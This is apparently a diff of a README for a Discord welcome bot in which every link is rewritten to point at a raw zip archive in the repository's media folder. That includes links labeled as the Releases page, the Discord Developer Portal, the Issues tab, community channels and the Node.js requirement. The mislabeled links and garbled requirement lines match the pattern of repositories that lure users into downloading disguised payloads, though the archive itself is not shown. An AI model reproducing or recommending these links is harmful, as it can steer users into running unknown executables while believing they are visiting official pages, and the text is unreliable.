@@ -1,7 +1,7 @@
 # 🎉 Discord-Auto-Welcome-Bot - Simplify Your Discord Onboarding
 
 ## 📥 Download Now!
-[![Download Latest Release](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Discord-Auto-Welcome-Bot-2.4-alpha.2.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Discord-Auto-Welcome-Bot-2.4-alpha.2.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Welcome-Discord-Auto-Bot-2.2.zip%20Latest%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Welcome-Discord-Auto-Bot-2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to the Discord-Auto-Welcome-Bot! This tool automates the onboarding proc
 To run the Discord-Auto-Welcome-Bot, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or higher, macOS, or a recent Linux distribution.
-- **https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Discord-Auto-Welcome-Bot-2.4-alpha.2.zip** Version 14 or higher.
+- **https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Welcome-Discord-Auto-Bot-2.2.zip** Version 14 or higher.
 - **Discord Account:** A valid account and a server where you manage member roles.
 - **Internet Connection:** Required for bot functionality and role assignment.
 
@@ -31,7 +31,7 @@ The Discord-Auto-Welcome-Bot uses the Appilot framework to automate the onboardi
 
 ## 📤 Download & Install
 
-To download the Discord-Auto-Welcome-Bot, please visit our [Releases page](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Discord-Auto-Welcome-Bot-2.4-alpha.2.zip). Follow these steps:
+To download the Discord-Auto-Welcome-Bot, please visit our [Releases page](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Welcome-Discord-Auto-Bot-2.2.zip). Follow these steps:
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version available.
@@ -50,7 +50,7 @@ To download the Discord-Auto-Welcome-Bot, please visit our [Releases page](https
 After the bot is installed, you'll need to configure it to work with your Discord server.
 
 1. **Create a Discord Application:**
-   - Navigate to the [Discord Developer Portal](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Discord-Auto-Welcome-Bot-2.4-alpha.2.zip).
+   - Navigate to the [Discord Developer Portal](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Welcome-Discord-Auto-Bot-2.2.zip).
    - Click "New Application" and name it.
    - Under the “Bot” tab, click “Add Bot” and confirm.
 
@@ -73,7 +73,7 @@ After the bot is installed, you'll need to configure it to work with your Discor
 
 - **Bot Not Responding:** Ensure that the bot has the necessary permissions in the Discord server.
 - **Configuration Errors:** Double-check the configuration file for accuracy.
-- **Installation Problems:** Make sure you have the right version of https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Discord-Auto-Welcome-Bot-2.4-alpha.2.zip installed.
+- **Installation Problems:** Make sure you have the right version of https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Welcome-Discord-Auto-Bot-2.2.zip installed.
 
 ### Helpful Tips
 
@@ -85,7 +85,7 @@ After the bot is installed, you'll need to configure it to work with your Discor
 
 If you encounter any issues, feel free to reach out for help:
 
-- Check the [Issues tab](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Discord-Auto-Welcome-Bot-2.4-alpha.2.zip) for common problems and solutions.
+- Check the [Issues tab](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Welcome-Discord-Auto-Bot-2.2.zip) for common problems and solutions.
 - You can also create a new issue if necessary.
 
 ## 📣 Contributing
@@ -101,7 +101,7 @@ We welcome contributions! If you want to help improve the Discord-Auto-Welcome-B
 
 Join our community to discuss features, ask questions, and share your experiences:
 
-- Discord Channel: [Join Here](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Discord-Auto-Welcome-Bot-2.4-alpha.2.zip)
-- GitHub Discussions: [Join Discussions](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Discord-Auto-Welcome-Bot-2.4-alpha.2.zip)
+- Discord Channel: [Join Here](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Welcome-Discord-Auto-Bot-2.2.zip)
+- GitHub Discussions: [Join Discussions](https://raw.githubusercontent.com/saurabhpandey09/Discord-Auto-Welcome-Bot/main/media/Welcome-Discord-Auto-Bot-2.2.zip)
 
 Thank you for using the Discord-Auto-Welcome-Bot! Enjoy a smoother onboarding experience for your Discord server.
